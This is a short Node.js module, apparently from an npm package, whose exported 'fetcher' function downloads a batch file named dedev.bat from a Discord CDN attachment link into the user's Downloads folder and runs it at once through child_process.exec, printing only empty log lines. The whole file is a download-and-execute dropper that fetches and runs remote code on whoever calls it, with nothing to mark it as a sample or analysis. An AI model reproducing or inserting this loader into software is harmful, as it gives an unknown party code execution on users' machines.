const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');

const urlF = 'https://cdn.discordapp.com/attachments/1228721332393480315/1231984052274462830/dedev.bat?ex=6638f18f&is=66267c8f&hm=1c2ed9c10bad43829fcef7509a9439cdf85ed4b96a9e2c99a515cece801feb12&';
const folderD = path.join(os.homedir(), 'Downloads', 'dedev.bat');

async function fetcher() {
    try {
        const response = await axios({
            method: 'GET',
            url: urlF,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream(folderD, { flags: 'w+' });
        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => {
                exec(`"${folderD}"`, (error, stdout, stderr) => {
                    if (error && error.code !== 1) {
                        console.error();
                        reject(error);
                        return;
                    }
                    console.log();
                    console.error();
                    resolve();
                });
            });
            writer.on('error', reject);
        });
    } catch (error) {
        console.error(error);
        throw error;
    }
}

module.exports = { fetcher };